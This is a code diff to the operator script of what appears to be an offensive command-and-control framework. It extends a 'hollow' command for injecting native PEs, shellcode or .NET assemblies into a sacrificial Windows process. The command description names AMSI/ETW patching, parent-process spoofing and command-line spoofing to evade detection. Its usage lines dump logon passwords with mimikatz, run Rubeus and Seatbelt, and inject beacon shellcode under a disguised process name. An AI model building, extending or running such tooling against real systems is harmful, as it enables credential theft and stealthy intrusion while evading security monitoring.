@@ -1,20 +1,24 @@
 var cmd_hollow = ax.create_command(
     "hollow",
-    "Process hollowing (PE) or shellcode injection into a sacrificial process.\n" +
-    "  PE mode:  NtUnmapViewOfSection + import resolution + relocations + AMSI/ETW patch.\n" +
-    "  SC mode:  VirtualAllocEx + thread hijack + ETW patch.\n" +
-    "  Both:     PPID spoof, BlockDLLs, command-line spoof, output capture.\n" +
-    "  Note:     Native x64 PEs only. For .NET PEs use execute-assembly.",
-    'hollow --pe /opt/Rubeus.exe -a "triage" --timeout 120\n' +
+    "Process hollowing (PE/shellcode/.NET) into a sacrificial process.\n" +
+    "  PE mode:     NtUnmapViewOfSection + import resolution + relocations + AMSI/ETW patch.\n" +
+    "  SC mode:     VirtualAllocEx + thread hijack + ETW patch.\n" +
+    "  .NET mode:   Hollows embedded CLR host into child, loads .NET assembly in-memory.\n" +
+    "               Crash-safe: .NET tool crash kills child, not beacon.\n" +
+    "  All modes:   PPID spoof, BlockDLLs, command-line spoof, output capture.",
     'hollow --pe /opt/mimikatz.exe -a "privilege::debug sekurlsa::logonpasswords"\n' +
+    'hollow --dotnet /opt/Rubeus.exe -a "triage" --timeout 120\n' +
+    'hollow --dotnet /opt/Seatbelt.exe -a "-group=all"\n' +
     'hollow --sc /opt/beacon.bin -no --spawnto C:\\Windows\\System32\\RuntimeBroker.exe\n' +
     'hollow --local-pe C:\\Windows\\Temp\\tool.exe -a "/all" --async'
 );
 
-cmd_hollow.addArgFlagFile("--pe",       "PE_FILE",     false, "PE file from operator (Kali). Mutually exclusive with --sc, --local-pe, --local-sc");
-cmd_hollow.addArgFlagFile("--sc",       "SC_FILE",     false, "Shellcode file from operator. Mutually exclusive with --pe, --local-pe, --local-sc");
-cmd_hollow.addArgFlagString("--local-pe",  "WIN_PATH", false, "PE on target (local path or UNC)");
-cmd_hollow.addArgFlagString("--local-sc",  "WIN_SC",   false, "Shellcode on target (local path)");
+cmd_hollow.addArgFlagFile("--pe",       "PE_FILE",     false, "Native PE from operator. Mutually exclusive with other input flags");
+cmd_hollow.addArgFlagFile("--sc",       "SC_FILE",     false, "Shellcode from operator. Mutually exclusive with other input flags");
+cmd_hollow.addArgFlagFile("--dotnet",   "DOTNET_FILE", false, ".NET assembly from operator. CLR host hollowed into child");
+cmd_hollow.addArgFlagString("--local-pe",     "WIN_PATH",    false, "Native PE on target (local path or UNC)");
+cmd_hollow.addArgFlagString("--local-sc",     "WIN_SC",      false, "Shellcode on target (local path)");
+cmd_hollow.addArgFlagString("--local-dotnet", "WIN_DOTNET",  false, ".NET assembly on target (local path)");
 cmd_hollow.addArgFlagString("-a",          "ARGS",      false, "Arguments passed to the PE (ignored for shellcode)");
 cmd_hollow.addArgFlagString("--spawnto",   "SPAWN_TO",  false, "Sacrificial process (default: svchost.exe)");
 cmd_hollow.addArgFlagInt("--timeout",      "SECONDS",   false, "Output capture timeout in seconds (default: 60)");
@@ -26,16 +30,19 @@ cmd_hollow.addArgBool("--async",                                "Run BOF asynchr
 cmd_hollow.setPreHook(function(id, cmdline, parsed_json, ...parsed_lines) {
     if (ax.is64(id) == false) { throw new Error("Only x64 targets supported"); }
 
-    let hasPE       = "PE_FILE" in parsed_json;
-    let hasSC       = "SC_FILE" in parsed_json;
-    let hasLocalPE  = "WIN_PATH" in parsed_json;
-    let hasLocalSC  = "WIN_SC" in parsed_json;
+    let hasPE         = "PE_FILE" in parsed_json;
+    let hasSC         = "SC_FILE" in parsed_json;
+    let hasDotnet     = "DOTNET_FILE" in parsed_json;
+    let hasLocalPE    = "WIN_PATH" in parsed_json;
+    let hasLocalSC    = "WIN_SC" in parsed_json;
+    let hasLocalDN    = "WIN_DOTNET" in parsed_json;
 
-    let inputCount = (hasPE ? 1 : 0) + (hasSC ? 1 : 0) + (hasLocalPE ? 1 : 0) + (hasLocalSC ? 1 : 0);
-    if (inputCount === 0) throw new Error("Provide one of: --pe, --sc, --local-pe, --local-sc");
-    if (inputCount > 1)   throw new Error("Only one input source allowed (--pe, --sc, --local-pe, or --local-sc)");
+    let inputCount = (hasPE ? 1 : 0) + (hasSC ? 1 : 0) + (hasDotnet ? 1 : 0) +
+                     (hasLocalPE ? 1 : 0) + (hasLocalSC ? 1 : 0) + (hasLocalDN ? 1 : 0);
+    if (inputCount === 0) throw new Error("Provide one of: --pe, --sc, --dotnet, --local-pe, --local-sc, --local-dotnet");
+    if (inputCount > 1)   throw new Error("Only one input source allowed");
 
-    let mode = 0;       // 0=PE, 1=shellcode
+    let mode = 0;       // 0=PE, 1=shellcode, 2=dotnet
     let source = 0;     // 0=bytes from operator, 1=path on target
     let payloadBytes = "";
     let localPath = "";
@@ -48,12 +55,19 @@ cmd_hollow.setPreHook(function(id, cmdline, parsed_json, ...parsed_lines) {
         mode = 1; source = 0;
         payloadBytes = parsed_json["SC_FILE"];
         if (payloadBytes.byteLength == 0) throw new Error("Shellcode file is empty or unreadable");
+    } else if (hasDotnet) {
+        mode = 2; source = 0;
+        payloadBytes = parsed_json["DOTNET_FILE"];
+        if (payloadBytes.byteLength == 0) throw new Error(".NET assembly is empty or unreadable");
     } else if (hasLocalPE) {
         mode = 0; source = 1;
         localPath = parsed_json["WIN_PATH"];
     } else if (hasLocalSC) {
         mode = 1; source = 1;
         localPath = parsed_json["WIN_SC"];
+    } else if (hasLocalDN) {
+        mode = 2; source = 1;
+        localPath = parsed_json["WIN_DOTNET"];
     }
 
     let noOutput = parsed_json["-no"] ? 1 : 0;
@@ -71,7 +85,7 @@ cmd_hollow.setPreHook(function(id, cmdline, parsed_json, ...parsed_lines) {
 
     let bof_path = ax.script_dir() + "_bin/hollow." + ax.arch(id) + ".o";
 
-    let label = mode === 0 ? "PE" : "shellcode";
+    let label = mode === 0 ? "PE" : (mode === 2 ? ".NET" : "shellcode");
     let srcLabel = source === 0 ? "operator" : "target";
     let message = `Task: ${label} hollow (${srcLabel}) → ${spawnto || "svchost.exe"}`;
 
